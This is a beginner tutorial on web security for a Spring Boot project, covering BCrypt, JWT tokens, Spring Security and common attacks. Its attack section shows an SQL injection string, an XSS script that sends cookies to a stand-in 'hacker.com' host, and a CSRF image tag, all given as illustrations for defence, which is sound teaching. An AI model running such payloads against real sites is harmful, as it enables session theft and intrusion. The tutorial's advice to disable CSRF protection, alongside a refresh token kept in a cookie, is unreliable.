# Security Basics (安全性基礎)

**Target Audience**: Complete beginners
**Purpose**: Understand web security concepts and how to implement them

---

## 1. Why Security Matters? (為什麼安全性很重要？)

### 1.1 真實案例

**2013 年 Adobe 密碼外洩事件**：
- 1.5 億個帳號密碼被駭
- **原因**：密碼沒有正確加密
- **後果**：公司商譽受損、被罰款、使用者資料被盜用

**你不想**：
- 使用者的密碼被偷走
- 別人可以假冒使用者身份
- 信用卡資料外洩
- 被告上法院

### 1.2 常見的安全漏洞

| 漏洞 | 說明 | 後果 |
|------|------|------|
| **明文密碼** | 密碼不加密直接存資料庫 | 資料庫被駭，所有密碼被看光 |
| **SQL Injection** | 可以透過輸入執行惡意 SQL | 刪除整個資料庫 |
| **XSS 攻擊** | 在網頁注入惡意 JavaScript | 偷取使用者 Cookie、Session |
| **CSRF 攻擊** | 偽造使用者的請求 | 未經同意執行操作（轉帳、刪除資料） |
| **Token 外洩** | JWT Token 被偷走 | 駭客可以假冒你的身份 |

---

## 2. Password Security (密碼安全)

### 2.1 絕對不能做的事

❌ **明文儲存密碼**：
```java
// 超級危險！絕對不要這樣做！
user.setPassword("MyPassword123");  // 直接存明文
userRepository.save(user);

// 資料庫看到的
| id | username | password      |
|----|----------|---------------|
| 1  | elvis    | MyPassword123 |  ← 任何人都看得到
```

**為什麼危險？**
- 資料庫管理員看得到
- 資料庫被駭，密碼全部外洩
- 使用者常常多個網站用同一組密碼，一個洩漏全部淪陷

### 2.2 正確做法：使用 BCrypt 加密

✅ **加密後儲存**：
```java
// 正確做法
String rawPassword = "MyPassword123";
String encryptedPassword = passwordEncoder.encode(rawPassword);
user.setPassword(encryptedPassword);
userRepository.save(user);

// 資料庫看到的
| id | username | password                                                      |
|----|----------|---------------------------------------------------------------|
| 1  | elvis    | $2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy |
```

**特色**：
- **不可逆**：無法從加密後的密碼還原成原始密碼
- **每次加密結果都不同**：同樣的密碼「MyPassword123」每次加密都不同
- **自動加鹽 (Salt)**：防止彩虹表攻擊

### 2.3 BCrypt 如何運作？

```
原始密碼: MyPassword123

↓ 加入隨機鹽 (Salt)
MyPassword123 + x8n3mQ2k

↓ 經過多次雜湊運算（預設 10 輪）
... 計算中 ...

↓ 產生加密密碼
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
  │  │  │                                                      │
  │  │  └─ Salt (隨機產生的鹽)                                  │
  │  └─ Cost Factor (運算次數，10 = 2^10 = 1024 次)             │
  └─ BCrypt 版本                                               └─ 實際的雜湊值
```

### 2.4 驗證密碼

```java
// 登入時驗證密碼
String inputPassword = "MyPassword123";  // 使用者輸入的密碼
String storedPassword = "$2a$10$N9qo8...";  // 資料庫存的加密密碼

boolean isMatch = passwordEncoder.matches(inputPassword, storedPassword);

if (isMatch) {
    // 密碼正確，允許登入
} else {
    // 密碼錯誤
}
```

**BCrypt 的 `matches()` 會**：
1. 從 `storedPassword` 取出 Salt
2. 用同樣的 Salt 加密 `inputPassword`
3. 比對兩個加密結果是否相同

---

## 3. Authentication vs Authorization (認證 vs 授權)

### 3.1 兩者的差異

| 概念 | 英文 | 說明 | 範例 |
|------|------|------|------|
| **認證** | Authentication | 驗證你是誰 | 登入時輸入帳號密碼 |
| **授權** | Authorization | 驗證你能做什麼 | 檢查你有沒有權限刪除文章 |

### 3.2 生活化比喻

**去機場搭飛機**：

1. **認證 (Authentication)**：
   - 出示身份證 →「證明你是 Elvis」

2. **授權 (Authorization)**：
   - 出示登機證 →「證明你可以登上這班飛機」
   - 頭等艙乘客可以進貴賓室（有權限）
   - 經濟艙乘客不能進貴賓室（沒權限）

### 3.3 程式碼範例

**認證**：
```java
// 使用者登入
User user = userService.login("elvis", "MyPassword123");
// 系統確認：你是 elvis（認證完成）
```

**授權**：
```java
// 使用者想刪除文章
if (user.getRole().equals("ADMIN")) {
    postService.delete(postId);  // 允許刪除（有授權）
} else {
    throw new ForbiddenException();  // 拒絕刪除（沒授權）
}
```

---

## 4. JWT (JSON Web Token)

### 4.1 什麼是 JWT？

**JWT = 一張加密的身份證**

**傳統做法（Session）**：
```
使用者登入 → 伺服器產生 Session ID → 存在伺服器記憶體
↓
每次請求都要帶 Session ID → 伺服器查記憶體確認身份
```

問題：
- 伺服器要記住所有使用者的 Session（耗記憶體）
- 多台伺服器時很麻煩（Session 要同步）

**JWT 做法**：
```
使用者登入 → 伺服器產生 JWT Token → 給使用者保存
↓
每次請求都帶 Token → 伺服器驗證 Token 簽章（不用查資料庫）
```

好處：
- 伺服器不用存 Session（省記憶體）
- 多台伺服器都可以驗證（只要有相同的密鑰）
- 前後端完全分離

### 4.2 JWT 結構

JWT 由三部分組成：
```
eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJlbHZpcyIsImlhdCI6MTY5OTk5OTk5OX0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
│                      │                                               │
Header                Payload                                         Signature
```

#### Header (標頭)
```json
{
  "alg": "HS512",  // 加密演算法
  "typ": "JWT"     // Token 類型
}
```

#### Payload (酬載，存放資料)
```json
{
  "sub": "elvis",           // Subject: 使用者名稱
  "iat": 1699999999,        // Issued At: 發行時間
  "exp": 1700003599,        // Expiration: 過期時間
  "role": "USER"            // 自訂欄位：使用者角色
}
```

#### Signature (簽章，防止竄改)
```
HMACSHA512(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

### 4.3 JWT 運作流程

```
1. 使用者登入
   POST /api/v1/auth/login
   Body: { username: "elvis", password: "MyPassword123" }

2. 伺服器驗證密碼
   ✓ 密碼正確

3. 伺服器產生 JWT Token
   Token: eyJhbGciOiJIUzUxMiJ9...

4. 回傳 Token 給使用者
   Response: { "accessToken": "eyJ..." }

5. 使用者存 Token（通常存在 localStorage 或記憶體）

6. 之後每次請求都帶 Token
   GET /api/v1/users/1
   Header: Authorization: Bearer eyJhbGciOiJIUzUxMiJ9...

7. 伺服器驗證 Token
   ✓ 簽章正確
   ✓ 沒有過期
   → 允許存取

8. 回傳資料
   Response: { "id": 1, "username": "elvis", ... }
```

### 4.4 Access Token vs Refresh Token

| Token 類型 | 用途 | 有效期限 | 存放位置 |
|-----------|------|---------|---------|
| **Access Token** | 存取 API 用 | 短（1 小時） | 記憶體（前端） |
| **Refresh Token** | 更新 Access Token 用 | 長（7 天） | HttpOnly Cookie |

**為什麼需要兩種 Token？**

**只有 Access Token 的問題**：
- 如果有效期很長（例如 7 天）→ Token 被偷走，駭客可以用 7 天
- 如果有效期很短（例如 5 分鐘）→ 使用者每 5 分鐘就要重新登入（超煩）

**Access Token + Refresh Token 的解決方案**：
1. Access Token 有效期短（1 小時）
2. Access Token 過期後，用 Refresh Token 換新的 Access Token
3. Refresh Token 有效期長（7 天）
4. 如果 Refresh Token 也過期了，才需要重新登入

**流程**：
```
使用者登入
↓
取得 Access Token (1hr) + Refresh Token (7d)
↓
用 Access Token 存取 API
↓
1 小時後，Access Token 過期
↓
用 Refresh Token 換新的 Access Token
↓
繼續使用（不用重新登入）
↓
7 天後，Refresh Token 過期
↓
需要重新登入
```

---

## 5. Spring Security Basics (Spring Security 基礎)

### 5.1 什麼是 Spring Security？

**Spring Security = Spring Boot 的安全框架**

功能：
- 處理認證（登入/登出）
- 處理授權（權限控制）
- 防止常見攻擊（CSRF、XSS）
- 密碼加密
- JWT 整合

### 5.2 核心概念

#### SecurityContext
**存放目前登入使用者的資訊**

```java
// 取得目前登入的使用者
Authentication auth = SecurityContextHolder.getContext().getAuthentication();
String username = auth.getName();  // 使用者名稱
```

#### UserDetails
**Spring Security 定義的使用者介面**

```java
public class CustomUserDetails implements UserDetails {
    private User user;

    @Override
    public String getUsername() {
        return user.getUsername();
    }

    @Override
    public String getPassword() {
        return user.getPassword();
    }

    @Override
    public Collection<? extends GrantedAuthority> getAuthorities() {
        return List.of(new SimpleGrantedAuthority("ROLE_" + user.getRole()));
    }

    // ... 其他方法
}
```

#### UserDetailsService
**Spring Security 用來載入使用者資料的服務**

```java
@Service
public class CustomUserDetailsService implements UserDetailsService {

    @Autowired
    private UserRepository userRepository;

    @Override
    public UserDetails loadUserByUsername(String username) {
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException("User not found"));

        return new CustomUserDetails(user);
    }
}
```

### 5.3 認證流程

```
1. 使用者發送登入請求
   POST /api/v1/auth/login
   { username: "elvis", password: "MyPassword123" }

2. AuthenticationManager 處理認證
   ↓
3. UserDetailsService.loadUserByUsername("elvis")
   → 從資料庫查詢使用者
   ↓
4. PasswordEncoder.matches(輸入密碼, 資料庫密碼)
   → 驗證密碼是否正確
   ↓
5. 認證成功
   → 產生 JWT Token
   ↓
6. 回傳 Token
```

### 5.4 授權流程

```
1. 使用者發送請求（帶 Token）
   GET /api/v1/users/1
   Header: Authorization: Bearer eyJ...

2. JwtAuthenticationFilter 攔截請求
   → 從 Header 取出 Token
   → 驗證 Token 簽章和過期時間
   ↓
3. Token 有效
   → 從 Token 取出 username
   → 設定 SecurityContext
   ↓
4. 檢查權限
   @PreAuthorize("hasRole('USER')")
   → 檢查使用者是否有 USER 角色
   ↓
5. 有權限
   → 執行 Controller 方法
   ↓
6. 回傳資料
```

---

## 6. Common Security Attacks (常見攻擊)

### 6.1 SQL Injection (SQL 注入)

**攻擊方式**：
```java
// 危險的程式碼（不要這樣寫）
String username = request.getParameter("username");
String sql = "SELECT * FROM users WHERE username = '" + username + "'";
// 如果 username = "admin' OR '1'='1"
// SQL 變成: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
// → 會回傳所有使用者！
```

**防禦方式**：使用 JPA 或 PreparedStatement
```java
// 安全的做法（用 JPA）
userRepository.findByUsername(username);
// Spring Data JPA 會自動處理 SQL Injection
```

### 6.2 XSS (Cross-Site Scripting)

**攻擊方式**：
```javascript
// 使用者在留言輸入
<script>
  // 偷取 Cookie 並傳送給駭客
  fetch('https://hacker.com/steal?cookie=' + document.cookie);
</script>

// 其他使用者看到這則留言時，腳本會執行
```

**防禦方式**：
```java
// Spring Boot 預設會 escape HTML
// 前端使用 React/Vue 時，也會自動 escape

// 如果要顯示 HTML，要用 sanitizer 清理
String cleanHtml = Jsoup.clean(userInput, Whitelist.basic());
```

### 6.3 CSRF (Cross-Site Request Forgery)

**攻擊方式**：
```html
<!-- 駭客網站的惡意頁面 -->
<img src="https://yourbank.com/transfer?to=hacker&amount=1000000">
<!-- 如果使用者已登入銀行網站，這個請求會成功執行 -->
```

**防禦方式**：
```java
// Spring Security 預設會防禦 CSRF
// 如果用 JWT，可以停用 CSRF（因為 JWT 不存在 Cookie）
http.csrf().disable();
```

---

## 7. Best Practices (最佳實踐)

### 7.1 密碼安全

✅ **Do (要做)**：
- 使用 BCrypt 加密密碼
- 密碼強度驗證（至少 8 字元、包含大小寫英文+數字）
- 限制登入失敗次數（防止暴力破解）

❌ **Don't (不要做)**：
- 明文儲存密碼
- 用 MD5 或 SHA1 加密（已被破解）
- 在 log 中印出密碼
- 在 email 中傳送密碼

### 7.2 JWT 安全

✅ **Do (要做)**：
- Secret Key 要夠長（至少 256 bits）
- Secret Key 存在環境變數，不要寫死在程式碼
- 設定合理的過期時間（Access Token: 1hr, Refresh Token: 7d）
- 使用 HTTPS（防止 Token 被攔截）

❌ **Don't (不要做)**：
- 把敏感資料（密碼、信用卡號）放在 JWT Payload
- Token 過期時間太長（例如 30 天）
- 把 Secret Key 放在程式碼或 Git

### 7.3 API 安全

✅ **Do (要做)**：
- 所有 API 預設都要認證（除了登入/註冊）
- 驗證所有使用者輸入
- 回傳錯誤時不要洩漏太多資訊
- 使用 HTTPS

❌ **Don't (不要做)**：
- 相信使用者的任何輸入
- 在錯誤訊息中洩漏系統資訊
- 忘記檢查權限（例如：使用者 A 修改使用者 B 的資料）

---

## 8. Security Checklist (安全檢查清單)

### 在這個專案中，我會確保：

- [ ] 密碼使用 BCrypt 加密（strength = 10）
- [ ] JWT Secret Key 存在 `application.properties`（不寫死在程式碼）
- [ ] Access Token 有效期 = 1 小時
- [ ] Refresh Token 有效期 = 7 天
- [ ] 所有 API 預設需要認證（除了 `/api/auth/register` 和 `/api/auth/login`）
- [ ] 使用者只能修改自己的資料
- [ ] 管理員才能刪除文章
- [ ] 驗證所有輸入（username、email、password 格式）
- [ ] 錯誤訊息不洩漏敏感資訊
- [ ] 使用 Spring Data JPA（防止 SQL Injection）
- [ ] 密碼不出現在 log 中
- [ ] 密碼不出現在 API 回應中

---

## 9. Real-World Example (實際範例)

### 9.1 註冊流程（安全版）

```java
@Service
public class AuthService {

    @Autowired
    private UserRepository userRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    public User register(RegisterRequest request) {
        // 1. 驗證輸入
        validateRegistrationInput(request);

        // 2. 檢查 username 是否已存在
        if (userRepository.existsByUsername(request.getUsername())) {
            throw new UsernameAlreadyExistsException();
        }

        // 3. 檢查 email 是否已存在
        if (userRepository.existsByEmail(request.getEmail())) {
            throw new EmailAlreadyExistsException();
        }

        // 4. 加密密碼
        String encryptedPassword = passwordEncoder.encode(request.getPassword());

        // 5. 建立使用者
        User user = User.builder()
            .username(request.getUsername())
            .password(encryptedPassword)  // 存加密後的密碼
            .email(request.getEmail())
            .role("USER")  // 預設角色
            .build();

        // 6. 存入資料庫
        return userRepository.save(user);
    }

    private void validateRegistrationInput(RegisterRequest request) {
        // 驗證 username
        if (request.getUsername().length() < 3) {
            throw new ValidationException("Username must be at least 3 characters");
        }

        // 驗證密碼強度
        if (!isStrongPassword(request.getPassword())) {
            throw new ValidationException("Password must contain at least 8 characters, including uppercase, lowercase, and numbers");
        }

        // 驗證 email 格式
        if (!isValidEmail(request.getEmail())) {
            throw new ValidationException("Invalid email format");
        }
    }
}
```

### 9.2 登入流程（安全版）

```java
@Service
public class AuthService {

    @Autowired
    private AuthenticationManager authenticationManager;

    @Autowired
    private JwtTokenProvider jwtTokenProvider;

    public LoginResponse login(LoginRequest request) {
        try {
            // 1. Spring Security 認證
            Authentication authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                    request.getUsername(),
                    request.getPassword()
                )
            );

            // 2. 認證成功，產生 Token
            String accessToken = jwtTokenProvider.generateAccessToken(authentication);
            String refreshToken = jwtTokenProvider.generateRefreshToken(authentication);

            // 3. 回傳 Token
            return LoginResponse.builder()
                .accessToken(accessToken)
                .refreshToken(refreshToken)
                .expiresIn(3600)  // 1 hour
                .build();

        } catch (AuthenticationException e) {
            // 4. 認證失敗（不要洩漏是 username 還是 password 錯誤）
            throw new InvalidCredentialsException("Invalid username or password");
        }
    }
}
```

---

## 10. Next Steps (下一步)

看完這份文件後，你應該要理解：
- [x] 為什麼密碼要加密
- [x] BCrypt 如何運作
- [x] 認證 vs 授權的差異
- [x] JWT 是什麼以及如何運作
- [x] Access Token vs Refresh Token
- [x] 常見的安全攻擊
- [x] 安全最佳實踐

**接下來**：
- 我會開始建立會員系統
- 你會看到這些概念如何實際應用在程式碼中
- 測試 API 時，你會體驗 JWT 認證流程

**記住**：
- **永遠不要相信使用者的輸入**
- **安全是設計時就要考慮的，不是事後補救**
- **密碼絕對不能明文儲存**

如果有任何不懂的地方，隨時問我！
